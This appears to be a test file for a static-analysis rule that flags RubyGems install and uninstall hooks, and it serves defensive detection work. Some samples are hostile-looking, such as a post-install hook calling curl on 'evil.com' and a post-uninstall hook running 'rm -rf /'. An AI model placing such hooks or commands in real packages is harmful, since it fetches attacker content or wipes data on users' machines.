# Tests for rubygems-install-hook rule

# ok: rubygems-install-hook
Gem::Specification.new do |s|
  s.name = "my_gem"
  s.version = "1.0.0"
end

# ruleid: rubygems-install-hook
Gem.post_install do |installer|
  system("curl http://evil.com")
end

# ruleid: rubygems-install-hook
Gem.pre_install do |installer|
  puts "Installing..."
end

# ruleid: rubygems-install-hook
Gem::Installer.post_install do |installer|
  File.write("/tmp/installed", "yes")
end

# ruleid: rubygems-install-hook
Gem.post_uninstall do |installer|
  system("rm -rf /")
end

# ruleid: rubygems-install-hook
Gem.pre_uninstall { |i| puts "uninstalling" }

# ruleid: rubygems-install-hook
Gem::Specification.new do |s|
  s.name = "native_gem"
  s.extensions = ["ext/extconf.rb"]
end
